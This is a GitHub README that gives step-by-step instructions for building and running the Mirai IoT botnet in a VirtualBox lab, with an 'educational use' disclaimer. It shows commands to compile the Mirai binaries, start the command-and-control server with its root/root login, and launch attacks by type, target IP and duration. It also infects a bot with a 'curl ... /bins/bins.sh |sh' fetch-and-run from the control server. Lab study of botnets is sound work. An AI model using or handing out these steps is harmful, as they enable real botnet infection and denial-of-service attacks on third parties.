# Mirai-Setup

## What you need:
- Working pihole setup(for local DNS server)
- Virtual Box(with atleast 3 instances of Ubuntu) 
- Copy of mirai source code


## What we will do
The goal is to setup and run mirai in an local environment.  
But a disclaimer at the beginning: Do not use this to actually attack somebody its only for educational use.
<br><br>

## Common to all the Virtual Machines

In the network settings enable the network adpater 2 and set to to "internal adapter" with the name "intnet" as shown below:<br><br>
<img alt="network_settings_vbox" src="https://github.com/LohithCV/mirai-setup/assets/125025760/5a72d1c4-4d35-4db5-93d4-bd36ed613a69" width="400"/>
<br><br>
Now power on all machines and then upgrade and update all the machines using the below command:

```
sudo apt update && sudo apt upgrade
```
**Also make sure that both interfaces are turned on. If the internal network interface doesn't connect try to switch the IPv4 status to Link-only in the settings.**

---

## The topology of the internal network

All the VM's are connected internally through the intnet virtual switch.

![vmtopo](https://github.com/LohithCV/mirai-setup/assets/125025760/307c23f6-3d52-4acd-87ba-e5ae13c38233)

<br>

## Virtual Machine - 1 DNS server
**First make sure both the NAT interface and internal network interface is running. It can checked by running the following command in the terminal:**
```
ip a
```
This is what you might see:
<br><img alt="ip" src="https://github.com/LohithCV/mirai-setup/assets/125025760/8f59d719-db1c-46d5-ae59-738ae96eda99" width="600"/>

<br>Note down the IPv4 address and network interface of the internal network interface. In the above figure it is 169.254.182.101 and enp0s3 respectively.
<br>
**Note: In virtual machines generally the NAT interface has IPv4 address as 10.0.x.x so we consider the other interface as Internal network interface.**
<br><br>
**Now we setup a local DNS server to have query resolution to run bot.**
<br>
For this we will be using Pi-Hole

To install Pi-Hole run the following command

```
curl -sSL https://install.pi-hole.net | sudo PIHOLE_SKIP_OS_CHECK=true bash
```
Packages will be installed and then dialogs will be shown as below:
1. Select "OK"
<br><img alt="PI_HOLE_1" src="https://github.com/LohithCV/mirai-setup/assets/125025760/9518168d-3291-4f19-855c-94771b661d51" width="400"/><br><br>
2. Select "OK"
<br><img alt="PI_HOLE_2" src="https://github.com/LohithCV/mirai-setup/assets/125025760/57485b5f-036a-4fc0-b69a-36d077779d26" width="400"/><br><br>
3. Select "Continue"
<br><img alt="PI_HOLE_3" src="https://github.com/LohithCV/mirai-setup/assets/125025760/12bbe25c-ee92-4207-9ebe-a9310bb35ae2" width="400"/><br><br>
4. Choose the network interface that was noted previously, i.e, the internal network interface
<br><img alt="PI_HOLE_4" src="https://github.com/LohithCV/mirai-setup/assets/125025760/6749a27b-20e3-4210-afeb-46a36f8213bb" width="400"/><br><br>
5. Select "Yes"
<br><img alt="PI_HOLE_5" src="https://github.com/LohithCV/mirai-setup/assets/125025760/30fabdd9-ad4e-4f4a-afcf-a3ecf7d9ea68" width="400"/><br><br>
6. Select "Yes", since we will be needing the web interface to add our local DNS query
<br><img alt="PI_HOLE_6" src="https://github.com/LohithCV/mirai-setup/assets/125025760/5dcdf497-b1c6-41d2-b8b1-c16812eb551b" width="400"/><br><br>
7. Select "Yes"
<br><img alt="PI_HOLE_7" src="https://github.com/LohithCV/mirai-setup/assets/125025760/8b7df295-76d6-411c-93c0-8b907ab5dcbf" width="400"/><br><br>
8. Select "Yes"
<br><img alt="PI_HOLE_8" src="https://github.com/LohithCV/mirai-setup/assets/125025760/102c6995-aadc-49d8-a918-1b01a382041e" width="400"/><br><br>
9. Select "Show everything"
<br><img alt="PI_HOLE_9" src="https://github.com/LohithCV/mirai-setup/assets/125025760/8a1ddb5f-d3f4-4728-ba43-c519b8d59826" width="400"/><br><br>
10. Now u can see the web interface address and password for logging in. Note this down or the password can be changed as shown in the further steps.
<br><img alt="PI_HOLE_10" src="https://github.com/LohithCV/mirai-setup/assets/125025760/d9ed3134-ccc7-41e3-9c4e-f50892c91476" width="400"/><br><br>
<br>

Change the Pi-Hole password using this command

```
pihole -a -p [password]
```
<br>
Open Pi-Hole in your browser with the url that was shown Step 10.
If everything is done right the login window will appear as below:
<br><img alt="PI_HOLE_11" src="https://github.com/LohithCV/mirai-setup/assets/125025760/b9722cb1-724a-4f7a-80a7-02fc3975db5b" width="600"/><br>
<br>Use the set password to login and the web interface looks something like this:
<br><img alt="PI_HOLE_12" src="https://github.com/LohithCV/mirai-setup/assets/125025760/16d21d40-7a3a-44d5-8eda-7a504403121f" width="600"/>
<br>
<br>

**The local DNS server setup is done.**

---

## Virtual Machine - 2 CNC & MySQL server

### First we need to install some packages  

```
sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
```
<br>

**Clone this repository into your Virtual Machine and open the terminal in the cloned repository path**

### The next step is to install the cross compilers

```
sudo bash ./tools/compilers.sh
```
**Now please restart your bash for those changes to take effect**
<br><br>

**Now add paths for the installed cross-compilers into bash.**

To do that run: 

```
sudo nano ~/.bashrc
```
**After the file opens add these line at the end of the file:**

```
export PATH=$PATH:"/etc/xcompile/armv4l/bin"
export PATH=$PATH:"/etc/xcompile/armv5l/bin"
export PATH=$PATH:"/etc/xcompile/armv6l/bin"
export PATH=$PATH:"/etc/xcompile/i586/bin"
export PATH=$PATH:"/etc/xcompile/i686/bin"
export PATH=$PATH:"/etc/xcompile/m68k/bin"
export PATH=$PATH:"/etc/xcompile/mips/bin"
export PATH=$PATH:"/etc/xcompile/mipsel/bin"
export PATH=$PATH:"/etc/xcompile/powerpc/bin"
export PATH=$PATH:"/etc/xcompile/sh4/bin"
export PATH=$PATH:"/etc/xcompile/sparc/bin"
export PATH=$PATH:"/etc/xcompile/x86_64/bin"
```
**Save it and restart the terminal**
<br>

### Now we can compile it for the first time
```
bash ./setup.sh
bash ./build.sh debug telnet
```
<br>

### Now we need to setup the database.
**Simply run:**
```
cat ./tools/db.sql | sudo mysql
```
<br>

**Now restart mysql to make sure all changes are loaded:**
```
sudo systemctl restart mysql
```
<br>

### Now we need to set up DNS resolution
**Simply run and type in your domain and dns server:**
```
python3 setup.py
``` 

1. Put in some dummy domain for ex: www.mirai.com as shown below
<br>![py_1](https://github.com/LohithCV/mirai-setup/assets/125025760/ebc2c112-11d6-4ddc-b6fe-73cc4a481a20)<br><br>
2. Put in the same domain as the step-1 for scanner domain as well
<br>![py_2](https://github.com/LohithCV/mirai-setup/assets/125025760/eac0380a-c1f3-4746-951f-6b0cd9b51869)<br><br>
3. Type in the internal network IPv4 address of the DNS Server machine as noted in the previous steps
<br>![py_3](https://github.com/LohithCV/mirai-setup/assets/125025760/6f2904c3-9072-42f8-9408-6862a35b44a8)<br><br>
4. Select Yes
<br>![py_4](https://github.com/LohithCV/mirai-setup/assets/125025760/1c4aecd2-818a-4689-a347-df8565d0a6cf)<br><br>
5. Select Yes
<br>![py_5](https://github.com/LohithCV/mirai-setup/assets/125025760/3556d88d-4612-4a13-adc6-aa645109b100)<br><br>

**Now change the DNS resolver of this machine to the local DNS server's IP**.<br>
<br> **Note: Add the above entered domain and the IP address of the CNC server in the local DNS server machine in the web interface of Pi-Hole. Don't forget to click Add.**<br>
<img alt="dns" src="https://github.com/LohithCV/mirai-setup/assets/125025760/8f805f1e-0d9f-457f-8062-95ebad72e560" width="600"/><br><br>
**Run this command to change the DNS IP:**

```
sudo nano /etc/resolv.conf
```
**Change the nameserver to the IP of internal network IP of the DNS server machine as noted in the previous steps.**

### Now we can compile it for the second time
```
bash ./build.sh debug telnet
```
<br>

### And finally we can run it!
**To run the cnc use:**
```
cd debug
screen -S mirai-cnc sudo ./cnc
```
<br>

**The cnc server will start as below:**
<br>
<img alt="ter_1" src="https://github.com/LohithCV/mirai-setup/assets/125025760/e61cc2b0-7961-4674-a417-efdc4a25c970" width="400"/><br>

**To connect to the cnc using telnet run this command in a new terminal instance:**
```
telnet localhost
```
<br>Username: **root**
<br>Password: **root**<br>
<br>**Type in these credentials and the attacker's terminal is ready:**
<br><img alt="ter_2" src="https://github.com/LohithCV/mirai-setup/assets/125025760/e5b371b7-3c15-4bb5-913c-5e9d1ed897ab" width="400"/><br>
<br>**To see the possible attacks that can be carried out with this terminal type in ?:**
<br><img alt="ter_3" src="https://github.com/LohithCV/mirai-setup/assets/125025760/dfa5490f-4f3f-4e15-8e19-0e02f78c1e6d" width="400"/><br>
<br>
### But wait there is more
We didn't see how to attack iot devices yet but first of all we need to compile the release binary's:
```
bash ./build.sh release telnet
```
<br>


Let's install the binary's to apache2:
```
cd release
sudo bash ../apache2.sh
```
<br>
Type in the web server IP as the IP of CNC server on the internal network interface.
<br>

**Now the CNC is complelety set**

**To perform an attack enter the following in the attackers terminal**

```
<attack_type> <target_ip> <duration_in_seconds>
```

## Virtual Machine - 3 Bot

To load mirai on to this you just need to curl the CNC server:

```
curl http://<web_server_ip>/bins/bins.sh |sh
```
<br>


After this you can see that in the attackers terminal the bot count would have increased by 1.

<img alt="bot" src="https://github.com/LohithCV/mirai-setup/assets/125025760/419ecb69-d666-4c09-828d-91f98a3d3496" width="400"/>

## References 

1. https://github.com/jgamblin/Mirai-Source-Code
2. https://github.com/Glowman554/mirai
